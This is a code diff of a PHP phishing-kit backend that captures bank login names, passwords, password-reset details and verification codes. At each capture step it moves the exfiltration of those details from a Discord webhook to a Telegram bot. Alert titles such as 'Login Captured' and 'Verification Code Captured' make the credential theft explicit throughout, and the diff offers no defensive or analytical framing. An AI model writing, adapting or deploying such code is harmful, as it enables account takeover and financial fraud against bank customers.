@@ -8,8 +8,10 @@
    Also: fires a Discord webhook notification on each successful capture.
    ════════════════════════════════════════════════════════════════════ */
 
-/* ── Discord Webhook Integration ────────────────────────────────── */
-require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ────────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
+}
 
 /* ── CORS / Headers ─────────────────────────────────────────── */
 header('Content-Type: application/json');
@@ -144,8 +146,8 @@ if ($step === 'login') {
     error_log($terminal_log);
     file_put_contents('php://stderr', $terminal_log);
 
-    /* ── Discord Notification (Step 1) ── */
-    sendDiscordAlert(
+    /* ── Telegram Notification (Step 1) ── */
+    sendTelegramAlert(
         '👻 ' . $bank . ' Login Captured',
         [
             'Platform'   => $bank,
@@ -211,8 +213,8 @@ if ($step === 'password') {
     error_log($terminal_log);
     file_put_contents('php://stderr', $terminal_log);
 
-    /* ── Discord Notification ── */
-    sendDiscordAlert(
+    /* ── Telegram Notification ── */
+    sendTelegramAlert(
         '🔑 Password Captured -- ' . $bank,
         [
             'Bank'       => $bank,
@@ -269,7 +271,7 @@ if ($step === 'forgot_password') {
     error_log($terminal_log);
     file_put_contents('php://stderr', $terminal_log);
 
-    sendDiscordAlert(
+    sendTelegramAlert(
         '⚠️ Forgot Password Clicked -- ' . $bank,
         [
             'Bank'       => $bank,
@@ -328,7 +330,7 @@ if ($step === 'reset_phone' || $step === 'reset_email') {
     error_log($terminal_log);
     file_put_contents('php://stderr', $terminal_log);
 
-    sendDiscordAlert(
+    sendTelegramAlert(
         '📱 Reset via ' . $reset_type . ' -- ' . $bank,
         [
             'Bank'                    => $bank,
@@ -387,7 +389,7 @@ if ($step === 'code') {
     error_log($terminal_log);
     file_put_contents('php://stderr', $terminal_log);
 
-    sendDiscordAlert(
+    sendTelegramAlert(
         '🔐 Verification Code Captured -- ' . $bank,
         [
             'Bank'       => $bank,
